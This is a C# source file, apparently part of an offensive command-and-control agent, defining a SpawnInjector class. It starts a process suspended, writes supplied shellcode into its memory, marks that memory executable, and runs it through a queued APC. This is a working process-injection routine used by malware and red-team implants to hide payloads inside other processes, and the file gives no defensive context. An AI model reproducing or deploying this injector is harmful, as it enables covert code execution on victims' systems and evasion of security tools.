using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Internal
{
    public class SpawnInjector : Injector
    {
        public override bool Inject(byte[] shellcode, int pid = 0)
        {

            var processAttribute = new Native.Kernel32.SECURITY_ATTRIBUTES();
            processAttribute.nLength = Marshal.SizeOf(processAttribute);

            var threadAttribute = new Native.Kernel32.SECURITY_ATTRIBUTES();
            threadAttribute.nLength = Marshal.SizeOf(threadAttribute);

            var startupInfo = new Native.Kernel32.STARTUPINFO();


            if (!Native.Kernel32.CreateProcess(@"C:\Windows\System32\iexplorer.exe", null,
                ref processAttribute, ref threadAttribute,
                false, Native.Kernel32.CreationFlags.CreateSuspended,
                IntPtr.Zero, @"C:\Windows\System32", ref startupInfo, out var processInformation))
            {
                return false;

            }
           var baseAddress = Native.Kernel32.VirtualAllocEx(
               processInformation.hProcess,
               IntPtr.Zero,
               shellcode.Length,
               Native.Kernel32.AllocationType.Commit | Native.Kernel32.AllocationType.Reserve,
               Native.Kernel32.MemoryProtection.ReadWrite);

           Native.Kernel32.WriteProcessMemory(
              processInformation.hProcess,
              baseAddress,
              shellcode,
              shellcode.Length,
              out _);

            Native.Kernel32.VirtualProtectEx(
               processInformation.hProcess,
               baseAddress,
               shellcode.Length,
               Native.Kernel32.MemoryProtection.ExecuteRead,
               out _);

            Native.Kernel32.QueueUserAPC(baseAddress, processInformation.hThread, 0);

            var result = Native.Kernel32.ResumeThread(processInformation.hThread);

            return result > 0; 

        }
    }
}
